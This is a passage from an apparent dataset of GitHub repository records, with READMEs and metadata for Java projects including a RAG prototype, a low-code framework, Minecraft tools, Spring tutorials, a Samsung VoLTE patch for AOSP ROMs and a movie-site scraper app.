else if a commit contains a feature it will increase to the next feature version (Y):

> **feat:** a commit of the _type_ `feat` introduces a new feature to the codebase (this correlates with [**`MINOR`**](http://semver.org/#summary) in Semantic Versioning).

otherwise it will increase to the next patch version (Y):

> **fix:** a commit of the _type_ `fix` patches a bug in your codebase (this correlates with [**`PATCH`**](http://semver.org/#summary) in Semantic Versioning).
>
> types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others.

**Rollback a release:** After release you are asked to confirm to push the release commit and tag to gitlab. You can always refuse it and cancel the release by removing the release commit (`git reset --hard HEAD~1`) and the tag (`git tag --delete vX.Y.Z`)

You can also manually select the version to release with the following command:

    task release:patch # To force the creation of a patch version
    task release:minor # To force the creation of a minor version
    task release:major # To force the creation of a major version

    task release:alpha # To force the creation of a pre-release alpha version (X.Y.Z-alpha.N)
    task release:beta # To force the creation of a pre-release beta version (X.Y.Z-beta.N)

## Conventional Commits

We are using [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) for commit messages.

The commit message should be structured as follows:

    <type>[optional scope]: <description>

    [optional body]

    [optional footer(s)]

Common types are:

* **Feature (`feat`)**: A commit of this type introduces a new feature to the codebase. This correlates with a [**`MINOR`**](http://semver.org/#summary) version in Semantic Versioning.
* **Fix (`fix`)**: A commit of this type patches a bug in your codebase. This correlates with a [**`PATCH`**](http://semver.org/#summary) version in Semantic Versioning.
* **Documentation (`docs`)**: A commit of this type only affects documentation.
* **Refactor (`refactor`)**: A commit of this type involves code refactoring, which neither fixes a bug nor adds a feature.
* **Style (`style`)**: A commit of this type pertains to formatting, white-space, or other changes that do not affect the meaning of the code.
* **Chore (`chore`)**: A commit of this type includes changes that do not relate to a fix or feature and do not modify source or test files. For example, updating dependencies.
* **Performance (`perf`)**: A commit of this type enhances performance.
* **Test (`test`)**: A commit of this type either adds missing tests or corrects existing tests.
* **Build (`build`)**: A commit of this type affects the build system or external dependencies. Example scopes include gulp, broccoli, npm.
* **Continuous Integration (`ci`)**: A commit of this type affects the continuous integration system configuration.
* **Revert (`revert`)**: A commit of this type reverts a previous commit.

**BREAKING CHANGE**: a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

Optional scopes can be anything specifying the place of the commit change. For example, it can be the reference of a ticket like `#1234`.

Example:

    feat(#1234): allow provided config object to extend other configs

    BREAKING CHANGE: `extends` key in config file is now used for extending other config files

    closes #1234
","The RAG Genie, an LLM RAG prototype to test and evaluate your embeddings, chunk splitting strategies using Q&A and evaluations.",,2024-04-12T15:33:11Z,2024-06-16T17:01:07Z,,0,3,7,27,1,14,64,3,0,MIT,Java
Parcheng/combine-java,main,"# 介绍
**combine-java** 是一个轻量级低代码框架，在框架中一切的功能皆为组件，您可以自由将各种组件组合在一起进行编排，实现自己的业务功能。<br>
**推荐JDK版本：11+**<br>
<br>

**工程结构：**<br>
**combine-java-core**：核心模块，所有的核心功能都在这里<br>
**combine-java-components**：系统内置组模块 - POM工程<br>
**combine-java-ui-html**：系统自带的UI页面组件模块，封装了一些公共UI元素组件<br>
**combine-java-starter**：快速使用模块，包含：核心模块、所有系统组件、页面组件模块，通过 POM 引入后即可使用全部功能<br>
**combine-java-spring-web**：内置了 SpringBoot 的快速使用模块，项目直接通过 pom 引入后即可快速使用。该工程可以直接启动，仅提供了 API 相关的页面和接口<br>
<br>
**系统内置组模块（combine-java-components）包含：**<br>
**combine-java-components-base**: 系统内置组件 - 基础组件包<br>
**combine-java-components-gui**: 系统内置组件 - SWING视图组件包<br>
**combine-java-components-mysql**: 系统内置组件 - MySql数据库组件包<br>
**combine-java-components-redis**: 系统内置组件 - Redis组件包<br>
**combine-java-components-rocketmq**: 系统内置组件 - RocketMQ组件包<br>
<br>

**本地启动并访问 API：**<br>
启动 combine-java-spring-web 工程<br>
组件的API地址：http://127.0.0.1:8888/combine/page/api<br>
UI的API地址：http://127.0.0.1:8888/combine/page/ui-api<br>
<br>

### 流程（FLOW）
**流程**：每个**流程**都有一个KEY（可以理解为请求接口的地址），并由多个**组件**组成（通过编排组件的执行过程来实现接口的业务逻辑，并返回结果）<br>
**组件**：业务功能的最小配置单元，基于输入数据来实现某个功能并将结果输出，它由初始化配置类、逻辑配置类、组件实现类组成<br>
<br>
通过引入 combine-java-components 包，可以使用很多系统内置的公共**组件**<br>
也可以通过 combine-java-core 核心包提供 SPI 机制自定义实现自己的**组件**<br>
<br>
**组件（component）包含三部分：**<br>
**初始化配置**：相当于同类型组件的全局配置，如：MySql 执行组件的数据库连接配置就是初始化配置<br>
**逻辑配置**：相当于组件独立配置，会直接影响组件的执行结果，如：MySql 执行组件要执行的具体SQL和增删改查就是逻辑配置<br>
**组件执行结果**：是组件直接完成后输出的结果<br>
<br>

### 页面（PAGE）
**页面**：每个**页面**都有一个KEY（可以理解为页面路径/名称），并由多个**UI元素组**组成<br>
**UI元素组**：每个**元素组**都有一个ID（用于在页面中引用），和一个**UI元素**的集合，用于组装多个**UI元素**组成一个完整的页面模块<br>
**UI元素**：组成页面的最小配置单元，它由元素配置类、元素模板配置类、元素功能的JS实现文件，元素模板配置Json文件组成
<br>
通过引入 combine-java-ui-elements 包，可以使用很多系统内置的公共**UI元素**<br>
也可以通过 combine-java-core 核心包提供 SPI 机制自定义实现自己的**UI元素**<br>
<br>
**UI组件（element）包含四部分：**<br>
元素配置：页面元素的配置<br>
元素模板配置：页面元素的模板配置，主要用于配置HTML标签的样式和属性等<br>
元素数据加载配置：用于**UI组件**加载外部数据（如：调用接口，JS函数等）<br>
事件触发配置：**UI组件**中可以包含多种事件触发配置，用于配置触发的事件（如：按钮点击等）和触发后要做的事（如：调用接口、调用函数、刷新页面的某个模块等）<br>
<br>

# 如何使用？
通过 POM 引用 combine-java-spring-web<br>
```$xml
<dependency>
    <artifactId>combine-java-spring-web</artifactId>
    <groupId>com.parch.combine</groupId>
    <version>0.10.0</version>
</dependency>
```

<br>编写一个组件Service和一个UI页面的Service，继承核心提供的 AbstractCombineWebService：<br>
```$java
@Service
public class CombineJavaService extends AbstractCombineJavaService {
    public CombineWebService() {
        // 这里传入传入全局配置的JSON文件（配置项可参考API）
        super(""config.json"");
    }

    // ... 可以写一些自定义方法 ...
}

@Service
public class CombineJavaPageService extends AbstractCombineJavaUIService {
    public CombineWebService() {
        // 这里传入传入全局配置的JSON文件（配置项可参考API）
        super(""ui_config.json"");
    }

    // ... 可以写一些自定义方法 ...
}
```

<br>编写一个 Controller<br>
其中 call 方法是常规接口，uploadAndCall 方法是包含文件上传的接口，page 方法是访问页面<br>
```$java
@RestController
@RequestMapping(""/"")
public class CombineTestController {

    @Autowired
    private CombineJavaService combineWebService;

    @Autowired
    private CombineJavaPageService combineJavaPageService;

    @PostMapping(""flow/{domain}/{function}"")
    public FlowResult call(@RequestBody Map<String, Object> params, @PathVariable(name = ""domain"") String domain, @PathVariable(name = ""function"") String function, HttpServletRequest request, HttpServletResponse response) {
        return combineWebService.call(params, domain, function, request, response);
    }

    @PostMapping(""file-flow/{domain}/{function}"")
    public FlowResult uploadAndCall(@RequestParam(""params"") String paramJson, @RequestParam(""file"") MultipartFile file, @PathVariable(name = ""domain"") String domain, @PathVariable(name = ""function"") String function, HttpServletRequest request, HttpServletResponse response) throws IOException {
        return combineWebService.uploadAndCall(paramJson, file, domain, function, request, response);
    }

    @GetMapping(""page/{pageKey}"")
    public String page(@PathVariable(name = ""pageKey"") String pageKey) {
        return combineJavaPageService.getPage(pageKey);
    }
}
```

<br>编写配置文件 config.json 放在 resource 根目录下：<br>
```$json
{
  ""initConfigs"": [
    ""configs/api_flow.json"",    -- 系统内置的流程配置API（可以不引入）
    ""configs/ui_api_flow.json""  -- 系统内置的UI配置API（可以不引入）
    ""configs/my_business.json""  -- 自己的业务流程配置（可以根据功能模块搞成多个文件）
  ],
  ""initFlows"": [
    ""$init""   -- 自己的业务功能需要项目启动时执行的流程（如：建MySql表，初始化缓存等）
  ],
  ""openRegisterConfig"": false,  -- 是否开放注册，true 表示可以在项目运行期间动态注册流程
  ""requestIdKey"": ""requestID"",  -- 全局 requestId 的 key，方便在日志中进行功能的全链路追踪
  ""printComponentResult"": true  -- 是否打印组件的执行结果
  -- 其他配置详见API
}
```
编写流程配置文件 configs/my_business.json 放在 resource 根目录下：<br>
通过在该文件编写组件配置，来实现自己的业务功能，详见API<br>

<br>编写 UI 配置文件 ui_config.json 放在 resource 根目录下：<br>
```$json
{
  ""configs"": [
    ""configs/api_page.json"",    -- 系统内置的流程配置API（可以不引入）
    ""configs/ui_api_page.json""  -- 系统内置的UI配置API（可以不引入）
    ""configs/my_page.json""      -- 自己的页面配置（可以根据功能模块搞成多个文件）
  ],
  ""baseUrl"": ""http://127.0.0.1:8888/combine"",    -- 根URL
  ""systemUrl"": ""http://127.0.0.1:8888/combine""   -- 系统文件加载路径的根URL
}
```
编写UI配置文件 configs/my_page.json 放在 resource 根目录下：<br>
通过在该文件编写组件配置，来实现自己的业务功能，详见API<br>
<br>

# 自定义组件
通过 SPI 加载<br>
在 resource/META_INFO/services 下创建文件 com.parch.combine.core.component.spi.AbstractGetComponents<br>
```
com.test.components.GetMyComponents
```

<br>创建 GetMyComponents 类：<br>
提示：这里创建的是组件包，一个组件包里会包含多个组件，系统会在加载时会自动扫描 GetMyComponents 类的所在包，获取该包下的所有组件<br>
注意：这个类必须要继承 AbsGetComponents<br>
```
public class GetMyComponents extends AbsGetComponents {
    public GetMyComponents() {
        super(""my"", ""我的组件包"", GetMyComponents.class);
    }
}
```

<br>创建自定义的组件1： My1Component 类<br>
提示：系统是根据 Component 直接来识别组件，该注解定义了组件的类型KEY、组件名称、组件的初始化配置和逻辑配置类<br>
```
@Component(key = ""test1"", name = ""我的组件1"", logicConfigClass = My1LogicConfig.class, initConfigClass = My1InitConfig.class)
@ComponentResult(name = ""我的组件1执行结果"")
public class My1Component extends AbsComponent<My1InitConfig, My1LogicConfig> {

    public DataEnumGetComponent() {
        super(My1InitConfig.class, My1LogicConfig.class);
    }

    @Override
    public FlowResult execute() {
        My1LogicConfig logicConfig = getLogicConfig();
        My1InitConfig initConfig = getInitConfig();

        try {
            ... ...
            return FlowResult.success(result);
        } catch (Exception e) {
            ComponentErrorHandler.print(My1ErrorEnum.FAIL, e);
            return FlowResult.fail(My1ErrorEnum.FAIL);
        }
    }
}
```

<br>创建 My1Component 的初始化配置类和逻辑配置类<br>
```$xslt
public interface My1LogicConfig extends ILogicConfig {

    // 使用 Field 相关注解，可以在访问 API 页面时生成自定义组件的描述信息
    @Field(key = ""key"", name = ""XXXX"", type = FieldTypeEnum.TEXT, isRequired = true)
    @FieldDesc(""XXXXXXXXXXXXXXXXXX"")
    String key();
}

public interface My1InitConfig extends IInitConfig {
    ... 自定义配置项 ...
}
```
<br>

# 自定义UI元素组件
通过 SPI 加载<br>
在 resource/META_INFO/services 下创建文件 AbsGetUIElements<br>
```
com.test.ui.elements.GetMyUIElements
```

<br>创建 GetMyUIElements 类：<br>
提示：这里创建的是UI元素包，一个UI元素包里会包含多个UI元素，系统会在加载时会自动扫描 GetMyUIElements 类的所在包，获取该包下的所有UI元素<br>
注意：这个类必须要继承 AbsGetUIElements<br>
```
public class GetMyUIElements extends AbsGetUIElements {
    public GetMyUIElements() {
        super(""my"", ""我的UI元素包"", GetMyUIElements.class);
    }
}
```

<br>创建自定义的元素配置类： MyElementConfig 类<br>
提示：系统是根据 PageElement 直接来识别组件，该注解定义了元素的类型KEY、元素名称、元素的模板配置类<br>
```
@PageElement(key = ""myElement"", name = ""我的自定义元素"", templateClass = AudioElementTemplateConfig.class)
public class MyElementConfig extends ElementConfig<AudioElementTemplateConfig> {

    // 使用 Field 相关注解，可以在访问 API 页面时生成自定义组件的描述信息
    @Field(key = ""src"", name = ""XXXX"", type = FieldTypeEnum.TEXT, isRequired = true)
    @FieldDesc(""XXXXXXXXXXXXXXXXXX"")
    private String src;

    public AudioElementConfig() {
        // 该UI元素的前端JS地址、CSS地址、模板JSON文件地址，及模板类Class对象
        super(""/lib/elements/my_element.js"", ""/lib/style/my_element.css"", ""/lib/temolate/my_template.json"", MyElementTemplateConfig.class);
    }

    @Override
    protected void initConfig() {
        ... 自定义配置初始化逻辑 ... 
    }

    @Override
    protected List<String> checkConfig() {
        ... 自定义配置检查逻辑，返回异常信息 ... 
        return null;
    }

    ... 其他自定义配置项和GET/SET方法 ...
}
```

<br>创建自定义的元素模板配置类： MyElementTemplateConfig 类<br>
```
public class MyElementTemplateConfig extends ElementTemplateConfig {

    // DomConfig 对象时是通用的 DOM 元素配置类，通过 FieldRef 注解可以直接引用系统内置的 DomConfig 属性 API 信息
    @Field(key = ""headerDiv"", name = ""XXXXX"", type = FieldTypeEnum.ANY)
    @FieldRef(DomConfig.class)
    private DomConfig headerDiv;

    ... 其他自定义配置项和GET/SET方法 ...
}
```

<br>创建UI元素JS实现： my_element.js<br>
```
$combine.element.register(""my.myElement"", (function () {
    const domFns = $combine.dom;

    ... ...

    return {
        build: function build(instance, data) {
            ... 根据数据（data）构建该元素的页面DOM ...
            return domFns.build(instance.template.external, ...);
        },
        refresh: function refresh(id, instance, parentData) {
            ... 根据新数据（parentData）刷新页面DOM元素实现 ...
        },
        getData: function getData(id) {
            ... 根据ID获取数据实现 ...
            return null;
        }
    }
})());
```

<br>创建UI元素模板JSON文件： my_template.js<br>
```
{
    ""external"": {
        ""tag"": ""div"",   -- HTML标签
        ""class"": """",    -- 样式Class配置
        ""style"": """",    -- 样式配置，格式如：“width:20px;height:20px;”
        ""text"": """",     -- HTML标签内的文本内容
        ""properties"": {}   -- HTML标签的属性配置，如: 可以设置 img 标签 src 属性
    },
    ""headerDiv"": {
        ""tag"": ""div"",
        ""class"": ""..."",
        ""style"": ""..."",
        ""properties"": { ... }
    },
    ... 其他DOM元素配置 ...
}
```
<br>

# 建议和反馈
您有任何问题请反馈到我的邮箱：p568866418@163.com
感谢支持！
",,,2024-04-30T09:33:24Z,2024-09-14T10:04:58Z,,0,2,45,315,0,1,59,5,0,Apache-2.0,Java
Jckf/DH-Support,develop,"# Server-side support for [Distant Horizons](https://gitlab.com/jeseibel/distant-horizons)

DH Support is a Bukkit/Spigot/Paper/Folia server plugin that transmits Level Of Detail (LOD) data to players with Distant Horizons installed. Distant Horizons _will_ work fine without this plugin, but then each client will have to be within normal view distance of chunks to load them, and they will not receive updates for distant chunks when they change. 

## Installation

Download the [latest release](https://github.com/Jckf/DH-Support/releases) and drop the JAR in your plugins folder, and you're done!

## Configuration

The default values should be pretty solid, but you may tweak them to better suit your specific needs. Everything you need to know should be in config.yml.

## Building

The project uses Maven, so just run `mvn` in the project directory to compile and package a new JAR.

## Contribution

There are several ways to contribute to this project. You can offer your feedback on [the DH Discord](https://discord.gg/xAB8G4cENx) in [this thread](https://discord.com/channels/881614130614767666/1154490009735417989), report any issues or bugs you find, attack an open issue and submit a pull request, or even [leave a donation](https://ko-fi.com/jimckf) ❤️

![Plugin usage statistics](https://bstats.org/signatures/bukkit/DH%20Support.svg)
",Server-side support for Distant Horizons.,"bukkit,bukkit-plugin,distant-horizons,minecraft,minecraft-plugin,paper,paper-plugin,spigot,spigot-plugin,folia",2024-04-07T15:21:24Z,2024-09-24T21:00:44Z,,5,1,40,140,7,0,57,2,1,GPL-3.0,Java
BramStoutProductions/MiEx,main,"![Header image](https://bramstout.nl/content/miex_main_artwork_logo.jpg)
MiEx is a modern Minecraft World Exporter written in Java, originally created for use by Bram Stout Productions to help create sets for animations. It has also been used for animations in Minecraft Live and Element Animation videos. MiEx exports out worlds into USD (Universal Scene Description).

# Features
* Uses Minecraft's Resource Pack system for an accurate export of the world, and allowing it to export with custom resource packs (including custom models).
* Support for modded worlds.
* Exports worlds out into big chunks (called export chunks) which each are payloaded into your scene, allowing you to only load in specific parts of the world when animating, so that the world won't slow down your computer.
* Level-of-Detail system to reduce polygon count in the far background, making it feasable to have massive sets.
* Remove caves feature to reduce polygon count.
* Ability to export certain blocks as a new instance for each occurence of the block, making it easy to replace those block (like a chest or a door) with a rig of the block.
* Up to 3x faster rendering with ray tracers (like Renderman, Arnold, Redshift, and Cycles) due to a custom made raytracing optimiser.
* Face optimiser that combines faces into larger faces, whenever possible, in order to reduce polycount.
* Powerful material templating system.
* Support for pipeline integration.
* Option to separate the world out into a foreground section and a background section.
* Custom random noise generator for block model selection to make randomly rotated textures appear nicer to the eye.
* Support for maps in item frames.
* Support for biome colours, including biome blending.
* Support for animated textures.
* Support for random frame offsets on animated textures.
* Support for grouping textures together into atlases in order to reduce material count.
* Support for adding a random offset to certain blocks (like vegetation) to reproduce what happens in Minecraft.
* Support for connected textures using Optifine's CTM format.
* ***Currently not yet implemented, but groundwork laid out for:*** Potential support for Minecraft Bedrock worlds.

MiEx currently supports worlds from Minecraft 21w43a and later.

# Installing
MiEx is released as a stand-alone Jar file which contains all that it needs. The base resource pack files are automatically gathered from the latest version of Minecraft that is installed on your computer. All that you have to do, is download the Jar file, place it wherever you want, and run it. You can get the latest release [here.](https://github.com/BramStoutProductions/MiEx/releases)

# Usage
For more information on how to use MiEx, please visit [our wiki!](https://github.com/BramStoutProductions/MiEx/wiki/1.-Home)

# Forum
Talk about MiEx, ask for help, help others, and share your creations on our [GitHub Discussions page!](https://github.com/BramStoutProductions/MiEx/discussions)
",A modern Minecraft Exporter,,2024-04-04T12:06:15Z,2024-07-26T22:28:45Z,2024-05-11T15:19:07Z,12,5,11,95,13,7,55,1,0,BSD-3-Clause,Java
sifacaii/VlcXWJellyfin,master,"# VlcXWJellyfin
# Jellyfin客户端
# 安卓4.2以上",,,2024-04-04T10:23:26Z,2024-04-17T07:59:44Z,2024-04-09T02:08:47Z,2,1,0,38,4,2,54,1,0,,Java
sivaprasadreddy/spring-boot-microservices-course,main,"# Spring Boot Microservices Course
This repository contains the source code for the [Spring Boot Microservices Course](https://www.youtube.com/playlist?list=PLuNxlOYbv61g_ytin-wgkecfWDKVCEDmB).

![Spring Boot Microservices course](docs/youtube-thumbnail.png)

We will build a BookStore application using Spring Boot, Spring Cloud, and Docker.

![BookStore Microservices Architecture](docs/bookstore-spring-microservices.png)

## Modules
* **catalog-service**: 
  This services provides REST API for managing catalog of products(books).
  
  **TechStack:** Spring Boot, Spring Data JPA, PostgreSQL

* **order-service**: 
  This service provides the REST API for managing orders and publishes order events to the message broker.

  **TechStack:** Spring Boot, Spring Security OAuth2, Keycloak, Spring Data JPA, PostgreSQL, RabbitMQ

* **notification-service**: 
  This service listens to the order events and sends notifications to the users.
  
  **TechStack:** Spring Boot, RabbitMQ

* **api-gateway**: 
  This service is an API Gateway to the internal backend services (catalog-service, order-service).

  **TechStack:** Spring Boot, Spring Cloud Gateway

* **bookstore-webapp**: 
  This is the customer facing web application where customers can browse the catalog, place orders, and view their order details. 

  **TechStack:** Spring Boot, Spring Security OAuth2, Keycloak, Thymeleaf, Alpine.js, Bootstrap

## Learning Objectives
* Building Spring Boot REST APIs
* Database Persistence using Spring Data JPA, Postgres, Flyway
* Event Driven Async Communication using RabbitMQ
* Implementing OAuth2-based Security using Spring Security and Keycloak
* Implementing API Gateway using Spring Cloud Gateway
* Implementing Resiliency using Resilience4j
* Job Scheduling with ShedLock-based distributed Locking
* Using RestClient, Declarative HTTP Interfaces to invoke other APIs
* Creating Aggregated Swagger Documentation at API Gateway
* Local Development Setup using Docker, Docker Compose and Testcontainers
* Testing using JUnit 5, RestAssured, Testcontainers, Awaitility, WireMock
* Building Web Application using Thymeleaf, Alpine.js, Bootstrap
* Monitoring & Observability using Grafana, Prometheus, Loki, Tempo (Membership)
* Kubernetes Basics (Membership)
* Deployment to Kubernetes (Membership)

## Local Development Setup
* Install Java 21. Recommend using [SDKMAN](https://sdkman.io/) for [managing Java versions](https://youtu.be/ZywEiw3EO8A).
* Install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
* Install [IntelliJ IDEA](https://www.jetbrains.com/idea) or any of your favorite IDE
* Install [Postman](https://www.postman.com/) or any REST Client

## Other Learning Resources
* [SivaLabs Blog](https://sivalabs.in)
  * [Spring Boot Tutorials](https://www.sivalabs.in/spring-boot-tutorials/)
  * [Kubernetes Tutorials](https://www.sivalabs.in/getting-started-with-kubernetes/)
  * [Spring Security OAuth 2.0 Tutorials](https://www.sivalabs.in/spring-security-oauth2-tutorial-introduction/)
  * [A Pragmatic Approach to Software Design](https://www.sivalabs.in/tomato-architecture-pragmatic-approach-to-software-design/)
* [SivaLabs YouTube Channel](https://www.youtube.com/c/SivaLabs)
  * [Spring Boot Tips Series](https://www.youtube.com/playlist?list=PLuNxlOYbv61jFFX2ARQKnBgkMF6DvEEic)
  * [Spring Boot + Kubernetes Series](https://www.youtube.com/playlist?list=PLuNxlOYbv61h66_QlcjCEkVAj6RdeplJJ)
  * [Spring Boot : The Missing Guide](https://www.youtube.com/playlist?list=PLuNxlOYbv61jZL1IiciTgWezZoqEp4WXh)
  * [Java Testing Made Easy: Learn writing Unit, Integration, E2E & Performance Tests](https://www.youtube.com/playlist?list=PLuNxlOYbv61jtHHFHBOc9N7Dg5jn013ix)
",YouTube Spring Boot Microservices Course Application,"alpinejs,docker-compose,grafana,keycloak,loki,maven,microservices,oauth2,postgresql,prometheus",2024-04-03T03:04:50Z,2024-06-24T00:47:47Z,,0,4,17,28,2,25,54,8,5,Apache-2.0,Java
NingNing0111/spring-ai-zh-tutorial,master,"
&emsp;语雀地址：[https://www.yuque.com/pgthinker/spring-ai](https://www.yuque.com/pgthinker/spring-ai)


- Spring AI - Chat API
  - [快速入门](doc/2.1%20快速入门.md)
  - [流式对话](doc/2.2.%20流式对话.md)
  - [上下文对话](doc/2.3.%20上下文对话.md)
  - [人设设置](doc/2.4.%20人设设置.md)
  - [Prompts模板语法](doc/2.5.%20Prompts模板语法.md)
  - [基于数据库的多Key轮询](doc/2.6.%20基于数据库的多Key轮询.md)
  - [基于Vue3实现流式对话](https://github.com/NingNing0111/spring-ai-zh-tutorial/tree/master/spring-ai-v1-stream-chat-demo)
    - 前后端分离，core是Vue源码，static是build出来的静态资源内容
    - 使用最新的Spring AI版本：1.0实现
    - 运行该模块后可以通过：`http://localhost:8898/index.html` 直接访问网站
  - [Function Call函数调用](doc/2.8.Function%20Call函数调用.md)
- Spring AI - Image API
  - [快速入门+源码介绍](doc/3.1.%20快速入门.md)
  - [AI自查实现对话和绘画](doc/3.2.%20AI自查判断聊天还是绘图.md)

- Spring AI - Embedding API

  - [Embedding API快速入门](doc/4.1.%20快速入门.md)
  - [向量数据库概述](doc/4.2.%20向量数据库概述.md)
  - [Embedding API结合向量数据库](doc/4.3.%20嵌入API结合向量数据库.md)
  - [RAG实战](doc/4.4.%20RAG实战.md)

- Spring AI - Transcription API

- 实战练习项目
  - [know-hub-ai](https://github.com/NingNing0111/know-hub-ai)：Spring AI and PGVector 基于个人知识库的AI问答系统。

# Spring AI教程

&emsp;Spring AI是Spring生态中应用于人工智能领域的应用框架，它的目标是将Spring 生态系统的设计原则（如可移植性、模块化设计）应用于AI领域，并在AI领域中推广使用POJO（Plain Old Java Objects）作为应用的构建模块。

&emsp;Spring AI能做什么？
- 支持目前主流大语言模型平台，例如 OpenAI、Microsoft、Amazon、Google 和 Huggingface；
- 支持阻塞与流式的文本对话；
- 支持图像生成(当前仅限OpenAI的dall-e-*模型和SD)；
- 支持嵌入模型；
- 支持LLM生成的内容转为POJO；
- 支持主流的向量数据库或平台：Azure Vector Search, Chroma, Milvus, Neo4j, PostgreSQL/PGVector, PineCone, Qdrant, Redis 和 Weaviate
- 支持函数调用
- 支持自动装配和启动器（与Spring Boot完美集成）；
- 提供用于数据处理工程的ETL框架；

&emsp; 相关资料

- GitHub仓库：[https://github.com/spring-projects/spring-ai](https://github.com/spring-projects/spring-ai)
- 官方文档：[https://spring.io/projects/spring-ai](https://spring.io/projects/spring-ai)

&emsp; 本栏目侧重于讲述：
- 基于OpenAI接口实现的对话调用，包括：阻塞式对话和流式对话；
- 实现上下文检索，让AI赋予记忆力；
- 基于提示词工程，让AI赋予专业能力；
- 基于OpenAI接口实现的绘图调用；
- 基于AI自查功能，通过文本对话让AI自行判断是对话还是绘图；
- 基于OpenAI接口实现文本向量化处理；
- 基于文本向量化处理和向量数据库实现RAG（增强式检索）技术；
- 基于OpenAI接口实现音频转录功能，赋予AI语音对话能力；
- 基于数据库存储实现多Key轮询，突破API请求限制；
- 使用OneAPI项目，统一世界主流大语言模型的接口；

&emsp;**本教程使用的大语言模型接口均以OpenAI为例**。

&emsp;版本说明：

- JDK >= 17
- Spring 6.x;Spring Boot 3.x
- Spring AI 0.8.1-SNAPSHOT

",Spring AI中文教程,,2024-04-22T10:15:19Z,2024-08-05T09:20:13Z,,0,2,1,15,3,21,54,1,0,,Java
jameskdev/android_samsung_imsservice,master,"# WHAT IS THIS?
These are files used to enable IMS (VoLTE) for Samsung Galaxy A21s (SM-A217N).
Original files were taken from Samsung Firmware A217NKSU6CUG1, with extensive modifications for enabling its use on AOSP ROMs.
While VoLTE has been confirmed to work on LineageOS 18.1 for A21s, additional works are needed for the following:
1. Enabling its use without setting SELinux to permissive
2. Testing it on other Android versions and other Galaxy devices
3. Enabling Video Call
4. Enabling RCS
5. Bug fixes & Stabilizations

While it has been tested only on A21s Korean version, it is likely that this will also work on other Samsung devices (albeit with some modifications.)
It's most likely to be compatible with trebilized Exynos devices. 
However, it doesn't mean that compatibility with Snapdragon or MediaTek devices is completely ruled out. As they seem to use the same RIL interface (libsec-ril), 
there is some chance that this will work with these devices (again, though, with some modifications.)

# WHAT MODIFICATIONS WERE MADE
1. Removing reference to Samsung's internal APIs (SemSystemProperties, etc)
2. Adding dependencies in the imsmanager.jar (com.samsung.android.EmergencyMode, com.samsung.android.feature)
3. Re-working imsservice so that it extends from Google's standard IMS Compat Activity namespace (android.telephony.ims.compat.*)

# HOW TO BUILD

0. REQUIREMENTS: JDK17 (Or higher, though not tested on versions other than 17), apktool, Android SDK with platform-30 (Android 11 Platform) installed, 7zip
1. Setup Environment
> export JAVA_HOME=(path to your JDK17 installation)
> export SDK_HOME=(path to your Android SDK installation. ex. ~/Android/Sdk)
> export APKTOOL_JAR_PATH=(path to the apktool.jar that you downloaded)

2. Build
> ./build.sh

3. This will generate the smali files that were used to patch imsservice.apk from Samsung Firmware A217NKSU6CUG1 for SM-A217N.

# HOW TO APPLY PATCH
The APK inside proprietary_vendor_samsung_ims has already been patched, so you only need to do this if you want to re-create the changes.
1. Obtain imsservice.apk from stock A217NKSU6CUG1 firmware
2. Decompile it using apktool
3. apply patch to smali files by running 'patch -p1 < smali_patch.diff'
4. remove following files inside smali folder:
> smali/com/sec/internal/google/-$$Lambda$GoogleImsService$GyhyR-v54YAwXDpQD-tEf5Wlrh0.smali
> smali/com/sec/internal/google/-$$Lambda$GoogleImsService$j4oR8wOS3QH8MgHgpOwnrA0XLGA.smali
> smali/com/sec/internal/google/-$$Lambda$GoogleImsService$orSTyMQHhF4e_hxk_v5pUUv6Hs0.smali
> smali/com/sec/internal/google/-$$Lambda$GoogleImsService$xMi-4NpfdpNYkU0AZXK7IS7B9uw.smali
> smali/com/sec/internal/google/-$$Lambda$htemI6hNv3kq1UVGrXpRlPIVXRU.smali
5. Generate the needed smali files by building the java files (explained above)
6. Copy over all the files inside smali_out into the decompiled APK's smali folder & overwrite all files
7. Replace AndroidManifest.xml with the one inside this repository
8. Re-build the decompiled APK and sign it using signapk with the appropriate key for your ROM.

# Shenanigans behind Samsung's IMS services
Samsung's IMS service was incompatible with AOSP ROMS, which is why VoLTE never worked on Galaxy devices running AOSP based ROMS
(such as GSI, LineageOS, /e/ os, etc.)

Instead of extending from android.telephony.ims.ImsService (or android.telephony.ims.compat.ImsService), Samsung modified the IMS apis to make it work
with the proprietary IMS implementation. This can be seen at class com.android.internal.telephony.ims.ImsServiceControllerCompat (located inside telephony-common.jar), 
which attempts to bind with ""ims6"" service (com.sec.internal.google.GoogleImsService)

Also, Samsung uses its own callback implementation(com.android.ims.internal.ISecImsMmTelEventListener) for sending IMS related notifications (such as incoming calls, etc) 
instead of PendingIntent used by AOSP's IMS Compat interface, so additional works were done to make it use this PendingIntent.

Moreover, Samsung's IMS services are very closely linked to Samsung's CMC (Call-and-message Continuity, also known as ""Call or Text on other device"") feature, making it
extra complicated. Lots of grunt work is needed to remove all the unnecessary stuff & only leave the right stuff needed for VoLTE & other necessary IMS features on Galaxy :(

",An attempt to enable IMS on samsung devices,,2024-04-05T08:05:34Z,2024-05-11T06:46:19Z,,0,1,0,7,3,5,53,1,0,,Java
670848654/MoviesBox,master,"# MoviesBox
![](https://img.shields.io/badge/Android-6.0%20or%20above-brightgreen.svg) [![Latest Release](https://img.shields.io/github/release/670848654/MoviesBox.svg)](../../releases) ![](https://badgen.net/github/stars/670848654/MoviesBox) ![](https://img.shields.io/github/downloads/670848654/MoviesBox/total) ![](https://img.shields.io/github/languages/top/670848654/MoviesBox.svg)

使用[jsoup](https://github.com/jhy/jsoup)HTML解析器爬取一些影视网站数据内容编写的第三方应用，需要Android 6.0及以上。<br><br>
精力有限且并非Android开发者，随缘更新🤪<br>
> 应用中所有数据均来自`网络`，`仅供学习交流，禁止非法传播或用于商业用途`。<br>

#### 支持站点

| 类型 | 站点名称 | 访问地址 |
| --- | --- | --- |
| 影视 | 拖布影视 | https://www.rainvi.com |
| 动漫 | 嘶哩嘶哩 | https://www.silisili.link |
| 动漫 | 樱花动漫 | http://www.iyinghua.io |
| 动漫 | AnFuns | https://www.anfuns.cc |
| 影视 | LIBVIO | https://www.libvio.pw |
